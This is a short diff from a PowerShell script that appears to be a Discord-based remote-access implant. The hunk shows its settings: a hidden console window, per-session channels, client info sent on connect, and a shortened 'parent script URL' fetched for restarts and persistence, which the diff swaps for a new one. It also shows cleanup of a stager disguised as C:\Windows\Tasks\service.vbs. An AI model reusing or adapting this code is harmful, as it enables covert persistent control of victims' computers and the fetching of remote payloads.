@@ -26,7 +26,7 @@ $chan = "$ch" # make sure the bot AND webhook can access this channel
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
-$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+$parent = "https://is.gd/sge3Dd" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
